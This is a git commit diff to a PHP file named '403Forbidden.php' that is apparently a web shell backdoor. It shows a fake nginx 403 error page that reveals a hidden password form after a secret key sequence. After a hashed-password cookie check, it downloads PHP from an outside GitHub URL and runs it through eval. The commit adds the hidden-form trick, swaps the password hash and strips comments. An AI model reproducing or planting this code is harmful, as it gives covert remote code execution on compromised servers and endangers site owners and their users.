e9f1056b2b905e3b7b5af80d091b4f80d2434c75
munz666 <70539315+munz666@users.noreply.github.com>
2024-06-19 15:23:01 +0700

    Update 403Forbidden.php

--- 403Forbidden.php
+++ 403Forbidden.php
@@ -1,12 +1,30 @@
 <?php
-$auth_pass = "31c95b07087222791e3f184e34d13a898b93485f37db57efbc9ba425d80aaa3c";
+$auth_pass = "e783310e3b58edd1d96b72e69fd8755cb11772537ea69598c9ab75c42cd70964";
 
 function Login() {
     die("<html>
     <title>403 Forbidden</title>
     <center><h1>403 Forbidden</h1></center>
     <hr><center>nginx (apache v.168 ./jerry_sys) </center>
-    <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
+    <center>
+    <div style='cursor:pointer;'></div>
+    <form id='login-form' method='post' style='display:none;'>
+        <input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'>
+    </form>
+    <script>
+    let clickCount = 0;
+    document.addEventListener('keydown', function(event) {
+        if (event.key === '3') {
+            clickCount++;
+            if (clickCount === 3) {
+                document.getElementById('login-form').style.display = 'block';
+            }
+        } else {
+            clickCount = 0;
+        }
+    });
+    </script>
+    </center>");
 }
 
 function VEsetcookie($k, $v) {
@@ -20,7 +38,7 @@ function fetchRemoteContent($url) {
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Timeout 10 detik
     $content = curl_exec($ch);
     if (curl_errno($ch)) {
-        // Menangani kesalahan jika ada
+       
         error_log('Error fetching remote content: ' . curl_error($ch));
         curl_close($ch);
         return false;
@@ -29,24 +47,24 @@ function fetchRemoteContent($url) {
     return $content;
 }
 
-// Memeriksa apakah pengguna sudah login
+
 function is_logged_in() {
     global $auth_pass;
     return isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) && ($_COOKIE[md5($_SERVER['HTTP_HOST'])] == $auth_pass);
 }
 
-// Memeriksa apakah pengguna sudah login
+
 if (is_logged_in()) {
-    // Jika sudah login, ambil konten dari URL eksternal dan evaluasi sebagai PHP script
+ 
     $a = fetchRemoteContent('https://raw.githubusercontent.com/munz666/scriptshelll/main/alfa-xjerry.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
-        // Jika gagal mengambil konten dari URL eksternal
+
         die('Failed to fetch remote content.');
     }
 } else {
-    // Jika belum login, tampilkan form login
+ 
     if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass)) {
         VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
     }
